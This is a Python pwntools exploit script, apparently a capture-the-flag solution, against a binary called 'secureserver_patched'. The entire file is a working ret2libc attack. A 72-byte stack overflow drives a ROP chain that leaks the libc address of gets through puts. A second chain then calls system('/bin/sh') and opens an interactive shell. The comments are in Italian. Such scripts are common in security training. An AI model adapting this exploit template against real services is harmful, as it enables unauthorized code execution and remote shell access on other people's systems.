#!/usr/bin/env python3

from pwn import *

elf = ELF("./secureserver_patched") #ricordati di cambiare exe a elf
libc = ELF("./libc.so.6")

context.binary = elf

context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b receive_feedback
    c
    ''')
else:
    conn = elf.process()




def main():
    conn.recvuntil(b":\n")
    conn.sendline(b'A'*72 +flat([
    0x40120b, # POP RDI
    elf.got["gets"],
    elf.plt["puts"],
    elf.sym["main"]
    ]))
    conn.recvline()
    c = u64(conn.recvline().strip().ljust(8, b"\x00"))

    libc.address = c - libc.sym["gets"]

    print(hex(libc.address))
    diobestia = next(libc.search(b"/bin/sh"))
    sleep(1)
    conn.sendline(b'A'*72 +flat([
        0x40120b, # POP RDI
        diobestia, #stringa /bin/sh da passare come parametro a system
        0x401016, #ret
        libc.sym["system"]
    ]))

    # good luck pwning :)

    conn.interactive()


if __name__ == "__main__":
    main()
